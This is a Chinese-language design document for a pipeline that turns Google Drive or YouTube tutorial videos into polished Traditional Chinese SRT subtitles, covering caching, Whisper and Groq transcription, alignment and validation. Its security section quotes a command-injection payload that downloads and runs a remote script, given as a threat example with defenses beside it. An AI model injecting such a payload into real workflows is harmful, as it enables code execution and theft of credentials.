# polish-screen-record 設計文件

**日期**：2026-08-15

Drive 上 1–8GB 的螢幕錄製教學影片 → 自動產出潤稿過的繁體中文 SRT，寫回影片同一個 Drive 資料夾。

---

## 1. 需求與約束

- **影片特性**：1–3 小時為主，每週幾支，存放於 Google Drive。
- **語言**：中文為主、夾雜英文技術詞。輸出繁體中文（台灣用語）。
- **觸發**：在 GitHub issue 上加 `srt` label；issue 內文含 Drive 檔案連結或 ID。
- **輸出位置**：寫回影片所在的同一個 Drive 資料夾。
- **Repo**：公開 repo。
- **影片大小上限**：8 GB，preflight 超過直接拒絕。

---

## 1.5 兩種來源

pipeline 接受兩種輸入，在取得 `words.json` 之後完全共用同一條下游流程。

| 來源 | issue 內文 | 產物位置 |
| --- | --- | --- |
| Drive 既有影片 | Drive 檔案連結或 ID | 與 mp4 同一個資料夾 |
| YouTube | YouTube 連結 | `videos/<slug>/` |

**YouTube 路徑**：解析 video ID → `yt-dlp` 取標題 → `slugify` → 在 Colab VM 上下載 mp4 並上傳到 Drive 的 `videos/<slug>/<slug>.raw.mp4` → 之後與 Drive 路徑完全相同。

在 **VM 上**跑 `yt-dlp` 而不是 runner：VM 到 Google 的頻寬好，而且影片檔完全不必經過 GitHub runner 的磁碟（runner 只有約 14GB 可用）。

**slug 保留中文、只去掉符號**，不轉拼音。這個資料夾會出現在使用者自己的 Drive 裡，看得懂比 ASCII 安全重要——`提示詞（Prompt）設計與實作技巧` 轉成 `tishici-prompt-...` 之後，在 Drive 列表裡根本認不出是哪一支。實測 `提示詞（Prompt）設計與實作技巧` → `提示詞-Prompt-設計與實作技巧`。

**連結解析與 Drive 檔案 ID 採同一個嚴格原則**：找到 0 個或 2 個以上**不同**的連結都直接失敗，絕不「取第一個」。猜錯的代價是花十幾分鐘轉錄了錯的影片，而且要看完才會發現。同一支影片被貼成 `youtu.be` 與 `watch?v=` 兩種形式視為一個，不算衝突。支援 watch / youtu.be / embed / shorts / live 五種形式。

---

## 2. 產物

以範例影片 `tutorial.mp4` 為例，pipeline 會在同一個 Drive 資料夾產出：

| 檔名 | 內容 |
| --- | --- |
| `tutorial.zh-Hant.srt` | 最終成品 |
| `tutorial.raw.srt` | 未潤稿對照 |
| `tutorial.words.json` | word-level timestamps |
| `tutorial.16k.mp3` | 抽出的音訊，16kHz mono MP3 @32kbps |
| `tutorial.manifest.json` | provenance 記錄 |
| `tutorial.polish-cache.json` | LLM 回應快取 |

---

## 3. 架構：內容定址的階段式 pipeline

pipeline 不是一條線性流程，而是一組**內容定址的純階段**。每個階段的 key = `hash(階段名 + 階段版本 + 輸入雜湊 + 參數)`。Drive 中已存在且 key 相符的產物直接重用，絕不重算。

```
video.mp4 ──(Drive 直接提供 md5Checksum，免下載即得輸入指紋)
   │
   ▼  stage: audio     key=h(md5, ffmpeg_ver, "16k-mono-mp3-32k")
tutorial.16k.mp3
   │
   ▼  stage: asr       key=h(audio_hash, engine, model_rev, decode_params)
tutorial.words.json  ← 引擎樂透只在這裡抽一次，抽完就凍結
   │
   ▼  stage: polish    key=h(words_hash, model, prompt_ver, glossary_hash)
tutorial.polished.json
   │
   ▼  stage: align     純函式，零 API
tutorial.zh-Hant.srt
```

**結果性質**：

- 第一次跑：Colab 拿到 GPU → words.json 落地，manifest 記下 engine。
- 重跑同一 issue：words.json key 相符 → 完全跳過轉錄，不再抽引擎樂透，輸出逐位元相同。
- 改 glossary：asr key 不變（重用），polish key 變（重跑）。
- Colab 壞掉只影響從未轉錄過的新影片。
- resume 是免費附贈的：Drive 的狀態本身就是 checkpoint。

---

## 4. 雙引擎與 fallback

- **主**：Colab CLI（[`googlecolab/google-colab-cli`](https://github.com/googlecolab/google-colab-cli)，官方，Apache-2.0）+ faster-whisper large-v3 on free T4。
- **備**：Groq `whisper-large-v3-turbo` API。
- **Fallback 條件**：**只在基礎設施層失敗時觸發**——拿不到 GPU、VM 被斷、超過硬超時。程式邏輯錯誤（ffmpeg 死、檔案找不到）直接失敗，不掩蓋問題。
- **關鍵設計**：Colab VM 直接從 Drive 下載影片（Google 內網），GH runner 全程不碰影片檔。只有 Groq fallback 路徑才需要 runner 下載影片。
- 兩條路徑收斂到同一個交接點 `words.json`；其後所有階段與引擎無關。

| | Groq API | Colab CLI + faster-whisper |
| --- | --- | --- |
| 3 小時影片轉錄耗時 | 約 1 分鐘（turbo 216x 實時） | 約 10–20 分鐘（T4） |
| 成本 | $0.04/小時 → 一支約 $0.12 | $0（但可能排不到 GPU） |
| word-level timestamps | 支援（`verbose_json` + `timestamp_granularities[]=word`） | 支援 |
| 檔案大小 | 免費 25MB / dev tier 100MB → 3 小時需切 2–3 塊 | 無限制 |
| 可靠性 | 確定性高 | 動態配額，可能失敗 |

16kHz mono MP3 @32kbps 約 14MB/小時（2026-08-16 實測：87.2 分鐘 → **21MB**，5.6GB 影片抽音訊僅 11 秒、470x 實時）。也就是說 **100 分鐘以內的影片整支就在 Groq 免費層 25MB 上限內，完全不需要切塊**；切塊邏輯只有超過約 1.7 小時才會啟用。3 小時約 43MB，切 3 塊即可；Whisper 內部本來就重採樣到 16kHz，音質無損失。切塊點用 ffmpeg `silencedetect` 落在靜音處，每塊記錄時間偏移量。

---

## 5. 確定性的三道鎖

「跑兩次結果一樣」做不到——GPU 浮點在不同卡型不保證位元一致，託管 LLM 因批次排程不保證可重現。真正的確定性保證來自快取，三道鎖的目的是**讓 hash key 真的代表輸入**。

### 鎖 1：環境釘選

Colab VM 不能跑 Docker，兩邊無法共用 image；改用同一份 `scripts/bootstrap.sh`。

| 項目 | 釘選方式 |
| --- | --- |
| ffmpeg | 靜態 build，固定 URL + sha256 驗證，不用 apt |
| Python 依賴 | `uv sync --frozen`（uv.lock 進版控） |
| 模型權重 | HF revision SHA，不是 main，不是 tag |
| CTranslate2 / compute_type | 明確釘 float16 |
| `google-colab-cli` 的依賴 | **必須釘 `jupyter-kernel-client==0.15.0`** |

GPU 型號寫進 manifest（不影響 key，但除錯時需要）。

⚠️ **`google-colab-cli` 上游宣告的是 `Requires-Dist: jupyter-kernel-client`，完全沒鎖版本。** 該套件 1.0.0 把 `KernelClient` 改名為 `JupyterKernelClient`，導致 CLI 一執行就 `AttributeError` 而完全無法使用。安裝時必須：

```bash
uv tool install google-colab-cli --with "jupyter-kernel-client==0.15.0"
```

這件事在 Phase 0 spike 當場踩到（見 §15）。它同時是本節存在理由的最佳示範：**沒鎖版本的依賴不是「將來可能出問題」，是「上游隨時可以讓你的 pipeline 停止運作」**。

### 鎖 2：解碼參數

```python
beam_size=1                      # 貪婪，不做 beam search
temperature=0.0                  # 單一值，不是 tuple
                                 # ← 預設會在壓縮率/logprob 不合格時
                                 #   自動重試 0.2, 0.4, 0.6...
condition_on_previous_text=False # ← 關鍵
vad_filter=True                  # 靜音幻覺防護
language="zh"
word_timestamps=True
```

`condition_on_previous_text=False` 的三個副作用：

1. 阻止幻覺迴圈擴散。
2. 錯誤不滾雪球。
3. 讓 Groq 的切塊結果與 Colab 的整檔結果變得可比較。

Groq 側同樣送 `temperature=0`。

### 鎖 3：LLM 輸出契約

`temperature=0, top_p=1, seed=42` 必要但不充分，外面再包內容快取 `tutorial.polish-cache.json`（存 Drive），key 含 `prompt_version`。輸出用 JSON schema 強制，斷行由陣列本身表達：

```json
{"lines": ["我們先來安裝 Python", "這邊要注意版本必須是 3.11 以上"]}
```

硬不變量：`"".join(lines)` 經正規化（去標點空白、繁簡統一）後與輸入正規化文字的編輯距離必須 ≤ 8%，超過即 reject。重試用 `seed = 42 + attempt`，退避固定 `[2, 8, 30]` 秒、不加 jitter。三次仍失敗 → 該窗降級為 raw 斷句，記進 manifest，job 繼續。

---

## 6. 潤稿

- **模型**：`openai/gpt-oss-120b`（Groq 生產級，131k context，500 tok/s）。留 config 開關可切 `llama-3.3-70b-versatile`。`qwen/qwen3.6-27b` 中文較強但為 preview 狀態，不作預設。
- **分段**：固定窗口約 3000 字，前後各帶 300 字**唯讀**上下文（避免接縫處斷句奇怪），可平行呼叫。
- **潤稿範圍三項**：
  1. 修正專有名詞/技術術語
  2. 標點與口語贅字
  3. 重切字幕行
- LLM 絕不輸出任何數字時間碼。
- ⚠️ **prompt 必須明確禁止刪除重複內容。** 真實影片實測發現：講者重複同一句話時，「刪除口語贅字」的指令會讓 LLM 把重複視為冗餘而整段刪除。逐字稿「導演 來個特寫來個特寫退出來個特寫退出」被潤成「導演，來個特寫！／退出。」，掉了約一半內容，編輯距離遠超 8% 上限。這在螢幕錄製教學裡很常見——講者常會重述操作步驟。
- ⚠️ **Whisper 的中文 word token 會帶前導空格**（實測 `' 來'`）。串接後會產生「導演 來個特寫」這種夾雜空格的中文字幕。清理規則：刪除兩側都是東亞寬字元的空白，但保留英文術語兩側的空白（「安裝 Python 環境」）。已實作於 `segment.clean_text`。

---

## 7. 對齊演算法

1. 兩側各壓成字元流，同時保留「字元位置 → 來源」的反查表（原始側指回 word index，潤稿側指回 line + offset）。任何一步都不能弄丟這張表。
2. 正規化只用於比對：去標點空白、繁簡統一、全半形統一、拉丁字母 casefold。正規化後的位置必須能反查回原始位置。

   繁簡統一是**逐字元**的，只折疊字形（`計算機`/`计算机` 相同），不折疊用詞（`軟體`/`软件` 仍視為不同）。詞彙級轉換需要跨字元的上下文，會破壞 1:1 索引映射；且用詞改動本來就是真實的內容修改，應計入 8% 編輯距離預算，而非被正規化抹平。
3. `difflib.SequenceMatcher(autojunk=False)` 取 opcodes。

   **強調這是強制的**：預設的 autojunk 會把「長度 ≥200 的序列中出現超過 1% 的元素」當雜訊丟掉——中文的「的、是、我、這」全部中標，比對會靜默地爛掉，不會報錯，只會給出錯誤的時間軸。
4. 每個斷行點映射到原始側：落在 `equal` 區塊內 → 精確對應；落在 `replace`/`insert` 內 → 吸附到最近的 `equal` 邊界，平手時固定取前者（決定性 tie-break）。
5. 原始字元位置 → 時間。**每個斷點推導出一對時間 `(前一行結束, 後一行開始)`**，而非單一值，因為兩者不一定相同——中間可能隔著靜音。分兩種情況：

   | 斷點位置 | 前一行結束 | 後一行開始 | 效果 |
   |---|---|---|---|
   | 落在 word **內部** | 內插值 | 同一個內插值 | 首尾相接，不重疊 |
   | 落在 word **之間** | 前一個 word 的 `end` | 這個 word 的 `start` | **保留中間的靜音** |

   內插公式：`t = word.start + (word 內位移 ÷ word 字元數) × (word.end − word.start)`。

   因為 word 時間單調不重疊，`prev.end ≤ word.start` 恆成立，所以 `cue[i].end ≤ cue[i+1].start` 是建構上的保證。

   ⚠️ **原始版本寫的是「行首 = 該區間第一個 word 的 start，行尾 = 下一個斷點前最後一個 word 的 end」，那是錯的。** 當斷點落在 word 內部，前後兩行會引用到同一個 word，前一行取它的 `end`、後一行取它的 `start`，必然產生時間軸重疊。實測 `words=[今天我們(0–2), 先來安裝(2–4), …]`、`lines=["今天我們先來安", "裝Python環境…"]` 得到 `cue1.end=4.0 > cue2.start=2.0`，重疊 2 秒。

   這對中文是常態而非邊緣案例：Whisper 對中文輸出多字詞，而重切字幕行本來就會切進 word 內部。驗證器雖然攔得下來，但那代表幾乎每個窗口都降級，重切功能等於報廢。內插假設 word 內字元等時長，誤差上限是該 word 自身的時長（通常 < 1 秒），遠優於重疊。
6. 錨點品質檢查：每行跨度內至少要有一個長度 ≥4 的 `equal` 區塊。沒有 → 該行標記 unanchored。**窗口內只要有一行 unanchored，整窗降級為 raw 斷句**。

**保守降級的理由**：只降級單行會在前後製造時間軸縫隙，需要縫合邏輯，而縫合邏輯本身是新的 bug 來源。保守版讓失敗看得見（某段字幕突然變醜就是訊號），而不是製造微妙的錯位。

---

## 8. 驗證器

| 檢查 | 條件 |
| --- | --- |
| 文字非空 | `text.strip()` 非空 |
| 區間合法 | `start < end` |
| 單調 | `cue[i].end ≤ cue[i+1].start` |
| 邊界 | `cue[0].start ≥ 0`、`cue[-1].end ≤` 音訊長度 |
| 行寬 | ≤ 20 全形（依 `east_asian_width`：W/F 記 1.0，其餘 0.5） |
| 時長 | 0.5–7.0 秒。超過 → 在最大字間隔處切；不足 → 在空檔允許下延長 |
| 閱讀速度 | ≤ 9 全形字/秒 |
| ~~術語完整~~ | ~~英文 token 不可被斷行切開~~ — **已移除，改由建構層保證**（見下） |
| 序號 | 從 1 連續遞增 |

字幕排版規範：單行、每行 ≤ 20 全形字。

⚠️ **「英文 token 不可被斷行切開」無法在驗證器層實作。** 驗證器只看得到字幕文字，而「原本這裡有沒有空格」在渲染時就被吃掉，因此它在原理上分不出「把 `prompt` 劈成 `prom`｜`pt`」與「在 `early`｜`breast` 兩個獨立單字之間斷行」。

87 分鐘實片實測：修正前 116 個違規多數為真，修正後剩下的 49 個經逐條檢視**全是誤報**。留著它等於每支影片的每個窗口都因假違規而降級，系統直接不可用。

改由**建構層保證**：`segment._split_without_breaking_ascii` 在斷行會切開連續 ASCII 英數串時，退回到該串的起點。根因是 **Whisper 把英文輸出成 BPE 子詞片段**——實測 `prompt` → `['prom','pt']`、`Agent` → `['A','gent']`、`2026` → `['20','26']`。

已知殘留：Whisper 偶爾在縮寫內插入空格（實測 `'T'` / `' N'` / `'BC'` → TNBC），建構層看到空格就認定可斷。應由潤稿階段修正。

---

## 9. 測試策略

robust 是在這裡掙來的，不是在 retry 邏輯裡。

- **Golden fixture**：repo 內放一份 60 秒的 words.json + 期望 SRT，逐位元比對。
- **Property-based（hypothesis）**：隨機產生 word 串 + 隨機的潤稿編輯（在預算內插入/刪除/替換），斷言不變量永遠成立。唯一能抓到沒想到的案例的方法。
- **Metamorphic**：潤稿若沒改任何字（恆等），輸出時間必須與 raw 在 1ms 內相同。
- **對抗性 fixture**：LLM 刪掉整句、插入整句、調換順序、90% 重複（幻覺）、空行、整行純英文。
- **測試套件零網路**：API client 層用錄下來的回應當 fixture。

---

## 10. 安全模型

- 觸發事件是 `issues: labeled`，公開 repo 中只有具 write 權限的人能加 label，GitHub 權限模型已擋掉主要路徑。
- **真正的攻擊面**：`github.event.issue.body` 絕不可直接內插進 `run:` 區塊。外人可開 issue 放 `$(curl evil.sh | sh)`，等被加 label 就在持有 Drive token 的 runner 上執行。全部走環境變數：

```yaml
env:
  ISSUE_BODY: ${{ github.event.issue.body }}   # ← 環境變數，不是內插
run: uv run psr parse-issue                     # ← Python 讀 os.environ，嚴格 regex
```

- 再加 `github.event.sender.login == github.repository_owner`（檢查**加 label 的人**，不是開 issue 的人）。
- ⚠️ **必須自建 OAuth client，不能借用 gcloud 的**（2026-08-16 實測）。`gcloud auth application-default login --scopes=...drive.readonly` 會被 Google 直接封鎖：「系統已封鎖這個應用程式」。Drive 屬於敏感範圍，而 gcloud 內建的 OAuth client 未通過 Drive 的驗證。因此 Phase 2 有一段**無法自動化的前置作業**，必須在 GCP Console 手動完成：啟用 Drive API → 設定 OAuth 同意畫面（External / Testing，把自己加為測試使用者）→ 建立「桌面應用程式」類型的用戶端 ID → 下載 `client_secret.json`。之後才能跑本機授權流程換取 refresh token。ADC（`cloud-platform` 範圍）仍可繼續供 Colab CLI 使用，兩者互不影響。
- **OAuth scope 最小組合**：`drive.readonly` + `drive.file`。`drive.file` 只涵蓋「本 app 建立或使用者明確選取」的檔案，單靠它連來源影片都讀不到；但兩者組合的結果是這個 token 在數學上無法修改或刪除任何不是它產生的檔案。
- **Colab VM 只拿唯讀、只活一小時**（已驗證為唯一可行路徑：`colab drivemount` 在無頭環境失敗，見 §15）：runner 用 refresh token 換 access token，只把 `drive.readonly` 那個送進 VM。VM 讀影片、跑轉錄，產物由 `colab download` 拉回 runner，**上傳一律由 runner 執行**。VM 從頭到尾沒有寫入權、從沒見過 refresh token。最壞情況是洩漏一小時的唯讀存取。

---

## 11. Drive 層的兩個陷阱

**陷阱 1：同名檔案可以共存。** `files.create` 每次都建新檔，重跑三次得到三個同名 SRT，UI 不會警告，webViewLink 各不相同。正確做法：

```
files.list  q = name = 'tutorial.zh-Hant.srt'
                and '<folderId>' in parents
                and trashed = false
  → 有：files.update（產生新 revision，舊版可還原）
  → 無：files.create
```

**陷阱 2：`drive.file` scope 看不到既有的 mp4**（已在 §10 說明，此處交叉引用即可）。

### 已端到端驗證（2026-08-16）

`drive.readonly` + `drive.file` 這組 scope 配上自建的桌面 OAuth 用戶端，實測全部成立：

| 驗證項目 | 結果 |
| --- | --- |
| 讀取私有影片 metadata | ✓ 不需把檔案設為公開 |
| `md5Checksum` 免下載即得 | ✓ `dc59346753cd8fb79b361c87f22fa46a`（5.98GB 影片，零傳輸） |
| 用 `drive.file` 在既有資料夾建立新檔 | ✓ SRT 成功寫到 mp4 旁邊 |
| find-or-update 冪等性 | ✓ 重跑走 `files.update`，同名檔案維持 1 個、未產生重複 |

`md5Checksum` 可在不傳輸任何影片資料的情況下取得，§3 的內容定址與 §12 的 preflight 因此都成立。

**上傳順序即 checkpoint**：`mp3 → words.json → raw.srt → manifest → zh-Hant.srt`，最終 SRT 最後上傳。中途死掉 → Drive 有前面的產物、沒有最終檔 → 下次重跑自動續，不需要外部狀態儲存。

---

## 12. Preflight 與失敗處理

- **Preflight** 在花任何錢之前跑完，且不傳輸任何影片資料：解析 file ID → `files.get` 取 `name, mimeType, size, md5Checksum, parents` → 驗證是 `video/*`、大小 ≤ 8GB、資料夾可寫（建 0 byte `.probe` 再刪）→ 比對 manifest，全部命中就留言「已完成，跳過」直接結束。
- **Issue 解析嚴格失敗**：內文必須恰好一個 Drive ID。0 個或 ≥2 個都直接 fail 並留言說明，絕不「取第一個」。
- **幻覺守衛**：VAD 之外加後處理——同句連續重複 ≥3 次、或字密度異常（>12 全形字/秒 或 <0.3 全形字/秒）→ 丟棄該段並記入 manifest。Whisper 在靜音段落產生重複句是已知行為，vad_filter 抓不完。
- **超時分層**：job `timeout-minutes: 120`；`colab exec` 硬超時 = 影片長度 × 0.3 + 10 分鐘；Groq 每塊 120 秒。Colab 超時即觸發 fallback。
- **並行**：`concurrency: group: srt-${{ github.event.issue.number }}`, `cancel-in-progress: false`。
- **已知殘留競爭條件（明確記錄為接受的風險）**：concurrency group 只能用 issue number（file ID 要進 job 才解析得到），所以兩個不同 issue 指向同一支影片時仍會並行。原子上傳保證不會拿到半截檔案，但後完成者會蓋掉先完成者。決定：不加 Drive 分散式鎖（會引入 stale lock、時鐘偏移、TTL 調參等新失敗模式），改為**偏執檢測**——preflight 寫一個帶 run_id 的標記，收尾前再讀一次，不符就在 issue 留言警告「偵測到另一個執行碰過這支影片」。看得見，但不阻擋。
- **回報**：只在 issue 留言，不動 label、不關 issue。留言含 manifest 摘要：引擎、快取命中情況、耗時、成本、降級窗口數、Drive 連結。
- **dry-run**：`srt-dryrun` label 觸發。跑完整條 pipeline、留言附前 30 行 SRT 預覽與成本估算，但不寫入 Drive。

---

## 13. 專案結構

```
src/psr/
  align.py      ★ 純函式  ← 專案的心臟
  validate.py   ★ 純函式
  srt.py        ★ 純函式
  polish.py       窗口切分 + 快取 + schema + 不變量
  asr/
    groq.py       切塊 + 偏移合併
    colab.py      colab exec 編排
    remote_job.py ← 這支被送進 Colab VM 執行
  drive.py        auth / preflight / find-or-update / 原子上傳
  manifest.py     provenance + stage key 計算
  issue.py        嚴格解析
  config.py       釘選常數、PROMPT_VERSION、STAGE_VERSIONS
  cli.py
tests/            golden + property + metamorphic + 對抗性
glossary.yml
scripts/bootstrap.sh   sha256 釘選的 ffmpeg + uv sync --frozen
uv.lock
.github/workflows/srt.yml
.github/workflows/ci.yml
```

Python 3.11，`uv` 管依賴。

---

## 14. glossary.yml

```yaml
version: 3
terms:
  - correct: "GitHub Actions"
    wrong: ["吉他哈伯", "github action", "Github actions"]
    whisper_hint: true    # 是否納入 224-token 的 Whisper prompt
```

一份餵兩處：Whisper 的 `prompt` 參數（**上限僅 224 tokens**，故只取 `whisper_hint: true` 的詞）與潤稿 LLM 的 prompt（可用完整表）。Whisper prompt 的填充是**貪婪且依 yml 順序**——固定輸入產生固定 prompt，不做「挑最相關的」智慧排序，因為那會讓 prompt 隨環境變動、破壞 stage key。

---

## 15. 實作順序

| Phase | 內容 | 依賴 |
| --- | --- | --- |
| **0** | **Spike：CI 無頭 ADC 能否拿到 T4** | 無，先做 |
| **1** | **純函式核心 + 完整測試** | 無，可與 0 並行 |
| 2 | Drive 層 + manifest + 內容定址 | 1 |
| 3 | **Groq 路徑（端到端最小可用系統）** | 2 |
| 4 | 潤稿 + 快取 | 3 |
| 5 | Colab 路徑 + fallback | 0, 4 |
| 6 | workflow + 回報 + dry-run | 5 |

**排序理由**：Phase 1 完全離線、不需憑證，卻是風險最高的部分，先做到有 property test 撐著。Groq 路徑排在 Colab 之前——先有一個確定性的、會動的完整系統，再加入會抽樂透的路徑；順序反過來會在 debug 對齊演算法的同時 debug Colab 配額，兩個變數纏在一起。

### Phase 0 spike 的具體步驟與判準

1. 本機 `gcloud auth application-default login`，取得 `application_default_credentials.json`。
2. base64 編碼存成 GitHub Secret `GCP_ADC_JSON`。
3. workflow 中寫回檔案並設 `GOOGLE_APPLICATION_CREDENTIALS`。
4. `uv tool install google-colab-cli`，執行 `colab exec --gpu T4 -f hello.py`。
5. 判準：能配置到 T4、`nvidia-smi` 有輸出、`colab download` 能取回檔案。

### Phase 0 spike 結果（2026-08-15，已驗證）

**結論：通過。** 原先標為「未解未知數」的問題——Colab API 是否接受消費者 Gmail 帳號的 ADC——答案是**接受**。`gcloud auth application-default login` 產生的憑證直接可用，**quota project 的 WARNING 無害**，不需要 `set-quota-project`。

實測輸出：

```
$ colab --auth adc run --gpu T4 --timeout 300 spike.py
[colab] Creating session 'run-7feaf7'...
[colab] Session READY (run-7feaf7). Executing spike.py...
SPIKE_OK python: 3.12.13
GPU: Tesla T4, 15360 MiB, 580.82.07
ffmpeg: /usr/bin/ffmpeg
disk_free_GB: 65.6
[colab] Stopping session 'run-7feaf7'...
real 0m19.8s
```

| 項目 | 實測值 | 對設計的影響 |
| --- | --- | --- |
| 配置 + 執行 + 釋放總耗時 | **19.8 秒** | 開關 VM 的成本可忽略 |
| GPU | Tesla T4 16GB | 足夠跑 large-v3 float16 |
| VM 磁碟可用 | 65.6 GB | 8GB 影片 + 音訊綽綽有餘 |
| ffmpeg | **VM 預裝** `/usr/bin/ffmpeg` | 但仍須用 bootstrap 釘選版本，見鎖 1 |
| VM Python | 3.12.13 | 與 runner 的 3.11 不同，`remote_job.py` 須相容兩者 |

**採用 `colab run` 而非 `new` + `exec` + `stop`。** 它在全新 VM 執行腳本後自動釋放，正是 CI 要的原語。⚠️ **`--timeout` 預設只有 30 秒**，轉錄務必顯式加大。

**`--auth` 預設是 `oauth2` 不是 `adc`**，CI 中必須顯式指定 `--auth adc`。

**`drivemount` 實測不可用於無頭環境**（`ValueError: mount failed`，需要互動式 OAuth）。因此 §10 的設計——runner 換發唯讀 access token 送進 VM、由 VM 以 Drive API 下載——不只是較安全的選擇，而是**唯一可行的選擇**。此點已從假設升級為驗證事實。

**仍未驗證**：以上皆為本機執行。GitHub Actions 無頭環境需再確認 base64 還原的 ADC 檔搭配 `GOOGLE_APPLICATION_CREDENTIALS` 可正常運作。風險已大幅降低，但尚未證明。

**若 CI 環節失敗**：Colab 退成本機手動執行，主路徑自動變成 Groq，Phase 1–4 的成果完全不受影響。

---

## 16. 決策記錄

| 決策 | 選擇 | 理由 |
| --- | --- | --- |
| 轉錄引擎 | Colab 主 / Groq 備 | 免費優先；fallback 因常被觸發而不會腐爛 |
| 時間軸策略 | LLM 只插斷點，時間由 word timestamp 推 | LLM 完全碰不到數字，杜絕時間軸漂移 |
| Drive 認證 | 個人帳號 OAuth refresh token | Service Account 在 My Drive 無儲存配額，寫入會 storageQuotaExceeded |
| 觸發 | issue + `srt` label | label 需 write 權限，天然有權限閘 |
| 中文 | 繁體（台灣用語） | |
| 字幕排版 | 單行 ≤ 20 全形字 | 螢幕錄製底部常有終端機內容，雙行會擋畫面 |
| 潤稿分段 | 固定窗口 3000 字 + 前後 300 字唯讀上下文 | 可平行、可快取、接縫自然 |
| 中間產物 | 全部保留（mp3 / words.json / raw.srt） | 是 checkpoint，也是出錯時的對照基準 |
| 影片上限 | 8 GB | |
| 並行鎖 | 不加，只做偏執檢測 | 分散式鎖的失敗模式比它解決的問題多 |
| dry-run | 有，`srt-dryrun` label | |
| 回報 | 只留言，不動 label 不關 issue | |

---

## 17. 參考來源

- [Google Colab CLI](https://github.com/googlecolab/google-colab-cli)
- [Introducing the Google Colab CLI](https://developers.googleblog.com/introducing-the-google-colab-cli/)
- [Groq Speech to Text](https://console.groq.com/docs/speech-to-text)
- [Groq Models](https://console.groq.com/docs/models)
